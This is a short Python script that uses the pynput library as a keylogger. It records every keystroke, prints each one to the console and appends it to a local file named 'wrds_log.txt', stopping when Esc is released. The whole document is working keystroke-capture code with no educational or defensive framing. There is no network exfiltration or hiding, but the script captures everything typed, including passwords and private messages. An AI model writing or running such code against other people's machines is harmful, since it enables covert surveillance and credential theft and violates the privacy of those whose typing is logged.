import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
  global keys, count

  keys.append(key)
  count += 1
  print("{0} pressed".format(key))

  if count >= 1:
      count = 0
      write_file(keys)
      keys = []

def write_file(keys):
  with open("wrds_log.txt", "a") as f:
     for key in keys:
        k = str(key).replace("'", "")

        f.write(k)


def on_release(key):
  if key == Key.esc:
     return False


with Listener(on_press=on_press, on_release=on_release) as listener:
  listener.join()

